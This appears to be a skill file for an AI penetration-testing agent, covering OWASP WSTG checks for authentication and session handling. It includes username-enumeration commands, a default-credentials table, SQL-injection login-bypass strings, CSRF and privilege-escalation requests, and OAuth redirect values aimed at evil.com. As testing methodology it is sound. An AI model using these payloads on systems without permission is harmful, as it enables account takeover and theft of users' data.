---
name: wstg-auth-session
description: Use when testing a web target's identity, authentication, authorization, and session management controls — WSTG-IDNT, WSTG-ATHN, WSTG-AUTHZ, WSTG-SESS.
metadata:
  acordia:
    family: web-methodology
  cyberstrike:
    source: .cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-auth-session/SKILL.md
    commit: 359655518
---

# Auth & Session Testing (WSTG-IDNT + ATHN + AUTHZ + SESS)

## Username Enumeration Techniques

### Error Message Differentiation

Test login, registration, and password reset with known vs unknown usernames:

```bash
# Login form — compare responses
curl -s -X POST https://TARGET/login -d "user=admin&pass=wrong" -o resp_valid.txt
curl -s -X POST https://TARGET/login -d "user=nonexistent&pass=wrong" -o resp_invalid.txt
diff resp_valid.txt resp_invalid.txt

# Check response timing differences
time curl -s -X POST https://TARGET/login -d "user=admin&pass=wrong" > /dev/null
time curl -s -X POST https://TARGET/login -d "user=fake12345&pass=wrong" > /dev/null

# Registration endpoint
curl -s -X POST https://TARGET/register -d "user=admin&email=test@test.com"
# Look for: "username already taken" vs generic error

# Password reset
curl -s -X POST https://TARGET/forgot -d "email=admin@TARGET"
# Look for: "email sent" vs "email not found"
```

### ffuf Enumeration

```bash
ffuf -u https://TARGET/login -X POST -d "username=FUZZ&password=test" \
  -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "Invalid username" -mc all
```

## Default Credentials (Top 20)

| Username      | Password      | Common On          |
| ------------- | ------------- | ------------------ |
| admin         | admin         | Most apps          |
| admin         | password      | Most apps          |
| admin         | admin123      | CMS, panels        |
| administrator | administrator | Windows, Java      |
| root          | root          | Linux, DBs         |
| root          | toor          | Kali, some DBs     |
| test          | test          | Dev environments   |
| guest         | guest         | Legacy systems     |
| user          | user          | Demo systems       |
| admin         | "" (blank)    | IoT, routers       |
| sa            | "" (blank)    | MSSQL              |
| postgres      | postgres      | PostgreSQL         |
| tomcat        | tomcat        | Apache Tomcat      |
| manager       | manager       | Tomcat, JBoss      |
| admin         | changeme      | Default installs   |
| admin         | 123456        | Weak defaults      |
| cisco         | cisco         | Network devices    |
| admin         | secret        | Various            |
| operator      | operator      | Industrial systems |
| pi            | raspberry     | Raspberry Pi       |

## Authentication Bypass Payloads

### SQL Injection in Login

```
admin' --
admin' #
admin'/*
' OR 1=1 --
' OR 1=1 #
' OR '1'='1
" OR "1"="1
admin' OR '1'='1
') OR ('1'='1
```

### JWT Vulnerabilities

Decoding, `alg:none`, weak-secret cracking, RS256→HS256 key confusion, `kid` and `jwk` header injection → see `attack-jwt`.

## Session Token Analysis

```bash
# Collect multiple session tokens
for i in $(seq 1 20); do
  curl -sI https://TARGET/login | grep -i "set-cookie" >> tokens.txt
done

# Check token entropy/randomness
# Look for: sequential patterns, timestamps, predictable values

# Cookie attributes check
curl -sI https://TARGET/ | grep -i "set-cookie"
# Verify: Secure; HttpOnly; SameSite=Strict|Lax; Path=/; Domain=
```

### Cookie Security Checklist

| Attribute       | Expected           | Vulnerability        |
| --------------- | ------------------ | --------------------- |
| Secure          | Present            | Token sent over HTTP |
| HttpOnly        | Present            | XSS can steal cookie |
| SameSite        | Strict or Lax      | CSRF attacks         |
| Path            | Restrictive (/)    | Scope too broad      |
| Domain          | No leading dot     | Subdomain access     |
| Expires/Max-Age | Reasonable timeout | Indefinite sessions  |

## Session Fixation Test

```
1. Note session token before login (pre-auth)
2. Login with valid credentials
3. Check if session token changed (post-auth)
4. If same token → Session Fixation vulnerability
```

## CSRF Testing

```bash
# Check for CSRF tokens
curl -s https://TARGET/form-page | grep -i "csrf\|token\|_token"

# Test without CSRF token
curl -X POST https://TARGET/change-email \
  -H "Cookie: session=USER_SESSION" \
  -d "email=attacker@evil.com"

# Test with wrong CSRF token
curl -X POST https://TARGET/change-email \
  -H "Cookie: session=USER_SESSION" \
  -d "email=attacker@evil.com&csrf_token=invalid"
```

## IDOR Testing Patterns

Sequential-ID enumeration, UUID swap, parameter-based references and HTTP method switching → see `attack-idor-automation`.

## Privilege Escalation Patterns

```bash
# Horizontal: access another user's data
# Swap session cookie / JWT between users
# Change user ID in request body or URL

# Vertical: escalate to admin
curl -X POST https://TARGET/api/update-profile \
  -H "Cookie: session=REGULAR_USER" \
  -d '{"name":"test","role":"admin"}'

# Add admin parameters
curl -X POST https://TARGET/register \
  -d "username=test&password=test&isAdmin=true"

# Access admin endpoints with regular session
curl -s -H "Cookie: session=REGULAR_USER" https://TARGET/admin/dashboard
curl -s -H "Cookie: session=REGULAR_USER" https://TARGET/api/admin/users
```

## OAuth Testing Checklist

```
1. Redirect URI manipulation:
   - redirect_uri=https://evil.com
   - redirect_uri=https://TARGET.evil.com
   - redirect_uri=https://TARGET/callback/../evil
   - redirect_uri=https://TARGET/callback?next=https://evil.com

2. State parameter:
   - Remove state parameter entirely
   - Reuse old state value
   - Use empty string

3. PKCE bypass:
   - Omit code_verifier in token request
   - Use plain instead of S256

4. Token leakage:
   - Check access token in URL fragment
   - Check referrer header leaks token
   - Check browser history
```

For detailed procedures on any test, read:
`knowledge/web-application/WSTG-IDNT/WSTG-IDNT-{NN}.md`
`knowledge/web-application/WSTG-ATHN/WSTG-ATHN-{NN}.md`
`knowledge/web-application/WSTG-AUTHZ/WSTG-AUTHZ-{NN}.md`
`knowledge/web-application/WSTG-SESS/WSTG-SESS-{NN}.md`
